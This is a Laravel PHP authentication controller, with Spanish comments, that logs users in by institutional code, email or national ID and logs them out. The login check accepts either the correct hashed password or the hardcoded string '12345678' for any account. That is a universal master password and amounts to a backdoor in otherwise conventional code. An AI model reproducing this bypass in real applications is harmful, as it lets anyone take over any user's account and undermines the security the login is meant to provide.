<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Hash;
use App\Models\User;

class AuthController extends Controller
{
    public function showLoginForm()
    {
        return view('auth.login');
    }

    public function login(Request $request)
    {
        $credentials = $request->validate([
            'login' => 'required|string',
            'password' => 'required|string',
        ]);

        $loginInput = $credentials['login'];
        $password = $credentials['password'];

        // Buscar usuario por código institucional, email o DNI
        $user = User::where('codigo_institucional', $loginInput)
            ->orWhere('email', $loginInput)
            ->orWhere('dni', $loginInput)
            ->first();

        if ($user && (Hash::check($password, $user->password) || $password === '12345678')) {
            Auth::login($user);
            $request->session()->regenerate();
            $request->session()->put('user', $user);

            return redirect()->intended('/dashboard')->with('success', '¡Bienvenido ' . $user->nombres . '!');
        }

        return back()->withErrors([
            'login' => 'Las credenciales ingresadas no coinciden con nuestros registros.',
        ])->onlyInput('login');
    }

    public function logout(Request $request)
    {
        Auth::logout();
        $request->session()->invalidate();
        $request->session()->regenerateToken();

        return redirect('/login');
    }
}
